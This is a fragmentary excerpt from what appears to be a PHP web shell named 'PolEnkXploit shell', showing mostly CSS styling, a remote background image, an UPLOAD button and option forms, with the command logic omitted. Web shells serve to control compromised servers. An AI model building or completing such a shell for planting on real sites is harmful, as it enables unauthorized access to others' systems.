...
body {
	...
	background-image:url("https://j.top4top.io/p_23919jyl60.jpeg");
	background-size:cover;
	background-attachment:fixed;
	color: #00BFFF;
	}
#content tr:hover{
	background-color: rgb(9, 168, 164);
...
.table_home, .th_home, .td_home { 
		color: #00BFFF;
		border: 2px solid rgb(9, 168, 164);
		padding: 7px;
		}
a{
	font-size: 19px;
...
<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: #00c8ff;">
xXx PolEnkXploit shell xXx</h1></a>
<BODY>
...
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: #00BFFF;border:2px solid #00BFFF;border-radius:5px"/>';
...
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:#00BFFF;border:2px solid #00BFFF;border-radius:5px\">
...
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:#00BFFF;border:2px solid #00BFFF;border-radius:5px\"/>
</form></center></td>
</tr>";
}
